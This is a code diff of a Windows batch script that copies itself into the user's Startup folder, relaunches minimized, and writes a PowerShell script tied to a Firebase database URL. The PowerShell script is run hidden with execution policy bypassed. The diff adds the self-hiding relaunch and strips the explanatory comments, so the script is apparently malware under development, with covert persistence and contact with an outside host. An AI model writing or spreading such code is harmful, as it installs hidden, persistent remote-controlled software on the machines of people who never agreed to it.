@@ -1,19 +1,14 @@
 @echo off
 setlocal
-
-:: Define paths for the folder and PowerShell script
+copy "%~f0" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
+if "%1"=="min" (shift & goto start)
+start /min cmd /c "%~f0" min & exit
+:start
 set "folderPath=%APPDATA%\TroloFolder"
 set "ps1File=%folderPath%\trolo.ps1"
-
-:: Ensure the folder exists
 if not exist "%folderPath%" (
     mkdir "%folderPath%"
 )
-
-:: Copy this batch script to Startup folder for persistence
-copy "%~f0" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
-
-:: Generate the PowerShell script dynamically
 echo $firebaseUrl = "https://trolo-1252e-default-rtdb.firebaseio.com/main.json" > "%ps1File%"
 echo function Check-WiFi { >> "%ps1File%"
 echo     $networkAdapters = Get-NetAdapter >> "%ps1File%"
@@ -57,8 +52,5 @@ echo         Write-Host "Error occurred: $_" >> "%ps1File%"
 echo     } >> "%ps1File%"
 echo     Start-Sleep -Seconds 1 >> "%ps1File%"
 echo } >> "%ps1File%"
-
-:: Run the PowerShell script hidden
 powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process powershell.exe -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File \"%ps1File%\"' -WindowStyle Hidden"
-
 endlocal
